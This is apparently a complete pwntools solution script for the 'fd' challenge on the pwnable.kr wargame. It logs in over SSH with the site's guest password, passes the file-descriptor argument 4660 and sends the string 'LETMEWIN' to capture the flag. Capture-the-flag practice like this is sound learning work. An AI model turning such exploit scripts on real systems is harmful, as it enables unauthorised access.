from pwn import *

shell   = ssh('fd', 'pwnable.kr', port=2222, password='guest')
process = shell.process(executable='./fd', argv=['fd', '4660'])
process.sendline('LETMEWIN')

print(process.recvall())

shell.close()
